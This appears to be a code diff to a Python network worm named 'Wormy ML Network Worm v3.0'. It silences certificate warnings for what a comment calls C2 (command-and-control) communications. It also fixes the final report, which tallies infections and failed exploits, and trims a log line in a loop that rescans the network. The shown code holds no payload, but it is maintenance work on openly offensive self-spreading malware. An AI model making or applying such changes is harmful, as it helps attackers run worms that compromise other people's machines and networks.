@@ -22,8 +22,14 @@ import json
 import asyncio
 import cmd
 import shlex
+import warnings
+import urllib3
 from typing import List, Dict, Optional, Tuple
 from datetime import datetime, timedelta
+
+# Suppress unverified HTTPS warnings for C2 communications
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 
@@ -1839,16 +1845,17 @@ class WormCore:
 
     def print_final_report(self):
         """Print final statistics and generate audit report"""
-        self.stats["end_time"] = self.stats.get("end_time", datetime.now())
+        self.stats["end_time"] = self.stats.get("end_time") or datetime.now()
+        start_time = self.stats.get("start_time") or datetime.now()
+        
         print(f"\n{'=' * 60}")
         print("FINAL REPORT")
         print(f"{'=' * 60}")
-        print(f"Start: {self.stats['start_time']}")
+        print(f"Start: {start_time}")
         print(f"End: {self.stats['end_time']}")
 
-        if self.stats["start_time"] and self.stats["end_time"]:
-            duration = self.stats["end_time"] - self.stats["start_time"]
-            print(f"Duration: {duration}")
+        duration = self.stats["end_time"] - start_time
+        print(f"Duration: {duration}")
 
         print(f"\nInfections: {self.stats['infections']}")
         print(f"Failed: {self.stats['failed_exploits']}")
@@ -2522,7 +2529,6 @@ Wormy ML Network Worm v3.0 - Available Commands:
                 break
 
             logger.info(f"\n--- ITERATION {iteration} ---")
-            logger.info(f"{'=' * 40}")
 
             if iteration % 5 == 0:
                 self.worm.scan_network()
